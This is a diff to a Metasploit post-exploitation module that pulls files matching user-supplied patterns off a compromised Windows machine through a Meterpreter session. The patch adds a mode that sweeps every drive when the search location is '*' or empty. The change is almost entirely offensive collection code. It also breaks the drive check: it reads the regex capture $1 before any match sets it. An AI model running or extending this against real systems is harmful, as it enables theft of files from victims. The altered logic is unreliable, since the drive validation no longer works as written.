@@ -1,3 +1,4 @@
+# -*- coding: UTF-8 -*-
 ##
 # This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -80,24 +81,8 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
-  def run
-    # When the location is set, make sure we have a valid path format
-    location = datastore['SEARCH_FROM']
-    if location and location !~ /^([a-z])\:[\\|\/].*/i
-      print_error("Invalid SEARCH_FROM option: #{location}")
-      return
-    end
-
-    # When the location option is set, make sure we have a valid drive letter
-    my_drive = $1
-    drives = get_drives
-    if location and not drives.include?(my_drive)
-      print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
-      return
-    end
-
-    datastore['FILE_GLOBS'].split(",").each do |glob|
+  def downloadOneDrive(location,my_drive)
+    datastore['FILE_GLOBS'].split(/[:,; \|]/).each do |glob|
       begin
         download_files(location, glob.strip)
       rescue ::Rex::Post::Meterpreter::RequestError => e
@@ -112,6 +97,34 @@ class MetasploitModule < Msf::Post
         end
       end
     end
+  end
+  
+  def run
+    # When the location is set, make sure we have a valid path format
+    drives = get_drives
+
+    # When the location option is set, make sure we have a valid drive letter
+    my_drive = $1
+
+    location = datastore['SEARCH_FROM']
+    if '*' == location or '' == location
+      drives.each do |i|
+        location = i + ":/"
+        downloadOneDrive(location,my_drive)
+      end
+      return
+    end
+    if location and location !~ /^([a-z])\:[\\|\/].*/i
+      print_error("Invalid SEARCH_FROM option: #{location}")
+      return
+    end
+
+    if location and not drives.include?(my_drive)
+      print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
+      return
+    end
+    
+    downloadOneDrive(location,my_drive)
 
     print_status("Done!")
   end
